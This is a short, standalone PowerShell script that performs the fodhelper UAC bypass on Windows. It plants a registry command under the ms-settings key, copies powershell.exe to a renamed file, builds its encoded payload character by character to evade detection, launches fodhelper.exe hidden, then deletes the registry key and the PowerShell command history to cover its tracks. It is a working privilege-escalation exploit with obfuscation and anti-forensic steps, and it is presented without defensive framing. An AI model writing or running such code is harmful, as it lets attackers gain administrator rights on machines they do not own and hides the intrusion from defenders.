function b1946ac92492d2347c6235b4d2611184 {
    $cmd = "C:\Windows\Tasks\bruh.exe -enc" + " " + [System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes("cm"+"d"+"."+"e"+"x"+"e"+" "+"/"+"c"+" "+"wh"+"oa"+"mi"+" "+"/"+"a"+"l"+"l"+" "+">"+" "+"C:"+"\u"+"a"+"c"+".t"+"xt"))
    copy C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Tasks\bruh.exe
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $cmd -Force
    c4ff45bb1fab99f9164b7fec14b2292a
}
function c4ff45bb1fab99f9164b7fec14b2292a {
    del $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -ErrorAction SilentlyContinue
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    Start-Sleep -s 3
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
}
b1946ac92492d2347c6235b4d2611184